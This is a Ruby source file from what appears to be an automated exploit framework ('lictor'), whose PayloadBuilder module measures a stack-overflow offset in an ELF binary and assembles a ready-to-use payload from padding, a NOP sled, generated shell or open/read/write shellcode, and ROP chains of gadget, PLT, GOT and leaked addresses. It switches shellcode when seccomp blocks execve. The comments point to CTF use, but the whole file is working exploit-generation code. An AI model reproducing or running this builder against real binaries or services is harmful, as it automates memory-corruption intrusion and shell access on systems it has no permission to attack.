# frozen_string_literal: true

require "yaml"
require "augure"
require "augure-profiler"

module Lictor
  # The asploit inheritance: from the decision to the actual bytes.
  # The offset is MEASURED (static frame read first, the cyclic pattern
  # under the debugger as verifier/fallback), the return address comes
  # from facts with their provenance, and the assembly follows a BUILD
  # LAYOUT - data, not code: lictor ships layouts for its built-in
  # families (config/build_layouts.yml) and packs may add layouts for
  # their own techniques. The result is a payload file - like the
  # original's ./payload dump - trailed for the audit.
  module PayloadBuilder
    class BuildError < StandardError; end

    module_function

    # binary: the acquired local ELF copy. facts: text or Facts.
    # technique: the selected technique (drives the layout).
    # packs: loaded augure packs - a pack build: layout for the
    # technique WINS over the built-in file (packs teach, the builder
    # follows).
    # Returns {path:, offset:, offset_source:, sink:, ret:, ret_source:,
    # arch:, size:}.
    def build(binary:, facts:, technique:, out:, payload_file: nil, packs: nil, shellcode_path: nil)
      facts = Augure::Facts.parse(facts) if facts.is_a?(String)
      # The ELF check FIRST: nothing executes - statically or under the
      # debugger - until the file is a real ELF.
      binary = File.expand_path(binary)
      raise BuildError, "#{binary} is not an ELF - nothing executes, statically or under a debugger" unless elf?(binary)

      # the acquired copy comes through File.binwrite (0644): the offset
      # measurement runs it under the debugger, it must be executable
      FileUtils.chmod(0o755, binary) unless File.executable?(binary)
      begin
        static = AugureProfiler::StaticOffset.offset(binary)
      rescue
        static = nil
      end
      offset = static&.dig(:offset)
      offset_source = offset ? "static-frame" : nil
      unless offset
        offset = AugureProfiler::Triage.offset(binary)
        offset_source = "gdb-cyclic" if offset
      end
      unless offset
        raise BuildError,
          "no measured offset - static analysis found no controlled return and the debugger did not either"
      end

      layout = layout_for(technique, packs)
      arch = AugureProfiler.arch(binary)
      width = (arch == :x64) ? "Q<" : "L<"
      body, ret, ret_source = assemble(facts, layout, offset, arch, width, payload_file, shellcode_path)
      File.binwrite(out, body)
      {path: out, offset: offset, offset_source: offset_source, sink: static&.dig(:sink),
       ret: ret, ret_source: ret_source, arch: arch, size: body.bytesize}
    end

    # lictor's data file first; a pack teaching the same technique with
    # a build: section overrides (packs teach, the builder follows).
    def layout_for(technique, packs = [])
      built_in = YAML.load_file(File.expand_path("../config/build_layouts.yml", __dir__))
      Array(packs).filter_map(&:build).find { |b| b["technique"] == technique }&.dig("layout") ||
        built_in.dig(technique, "layout") or
        raise BuildError, "no build layout for #{technique} - teach one in the pack or in build_layouts.yml"
    end

    # The layout slots, resolved against the facts and the measurement.
    # Every unresolved reference is a loud error: the builder never
    # guesses a byte.
    def assemble(facts, layout, offset, arch, width, payload_file, shellcode_path = nil)
      body = +""
      ret = nil
      ret_source = nil
      layout.each do |slot|
        case slot[0]
        when "padding"
          filler = (slot[2] == "sled") ? "\x90" : "A"
          body << (filler * offset).b
        when "qword", "dword"
          # dword is 4 bytes WHATEVER the arch (a partial overwrite);
          # qword is the arch's pointer width (8 on x64, 4 on x86)
          slot_width = (slot[0] == "dword") ? "L<" : width
          value, source = resolve_addr(facts, slot[1], slot_width)
          ret ||= value
          ret_source ||= source
          body << [value].pack(slot_width)
        when "shellcode"
          sc = if payload_file
            File.binread(payload_file)
          else
            stub = (slot[1] || "sh").to_sym
            # the orw stub embeds its flag path: the slot's third
            # element or the builder-level shellcode_path
            path = ((slot.size > 2) ? slot[2] : nil) || shellcode_path
            # seccomp: execve dies, the sh stub is a booby trap - the
            # orw chain (open/read/write, clean exit) is the answer;
            # the flag path defaults to the CTF convention.
            if stub == :sh && facts["seccomp"]&.first&.first == "true"
              stub = :orw
              path ||= "flag.txt"
            end
            AugureProfiler::Shellcode.generate(shellcode_klass(arch), stub, path: path)
          end
          body << sc.b
        when "chain"
          slot[1..].each do |ref|
            value, source = resolve_addr(facts, ref, width)
            ret ||= value
            ret_source ||= source
            body << [value].pack(width)
          end
        else
          raise BuildError, "unknown build slot #{slot[0].inspect}"
        end
      end
      raise BuildError, "the layout produced no return address" if ret.nil?

      [body, ret, ret_source]
    end

    # slot ref -> (address, provenance). "win" = the win_symbol fact,
    # "gadget:TYPE" = the first gadget of that type (verified before use).
    def resolve_addr(facts, ref, _width)
      case ref
      when "win"
        win = facts["win_symbol"]&.first
        raise BuildError, "no win_symbol fact - the winning function's address is unknown" unless win

        [win[1], "win_symbol:#{win[0]}@#{win[1]}"]
      when /\Agadget:(.+)\z/
        type = Regexp.last_match(1)
        gadget = facts["gadget"]&.find { |t, _| t == type }
        raise BuildError, "no #{type} gadget in the facts" unless gadget

        [gadget[1], "gadget:#{type}@#{gadget[1]}"]
      when /\Aleak:(.+)\z/
        name = Regexp.last_match(1)
        leak = facts["leaked_address"]&.find { |n, _| n == name }
        raise BuildError, "no leaked_address(\"#{name}\") fact - harvest the service first" unless leak

        [leak[1], "leaked_address:#{name}@#{leak[1]}"]
      when /\Aplt_addr:(.+)\z/
        name = Regexp.last_match(1)
        entry = facts["plt_addr"]&.find { |n, _| n == name }
        raise BuildError, "no plt_addr(\"#{name}\") fact - profile the binary first" unless entry

        [entry[1], "plt_addr:#{name}@#{entry[1]}"]
      when /\Agot_addr:(.+)\z/
        name = Regexp.last_match(1)
        entry = facts["got_addr"]&.find { |n, _| n == name }
        raise BuildError, "no got_addr(\"#{name}\") fact - profile the binary first" unless entry

        [entry[1], "got_addr:#{name}@#{entry[1]}"]
      when /\Aconst:(\d+)\z/
        [Regexp.last_match(1).to_i, "const:#{Regexp.last_match(1)}"]
      else
        raise BuildError,
          "unknown address reference #{ref.inspect} (win | gadget:TYPE | plt_addr:NAME | got_addr:NAME | leak:NAME | const:N)"
      end
    end

    def elf?(path)
      File.open(path, "rb") { |f| f.read(4) == "\x7fELF" }
    rescue
      false
    end

    def shellcode_klass(arch)
      (arch == :x64) ? Metasm::X64 : Metasm::Ia32
    end
  end
end
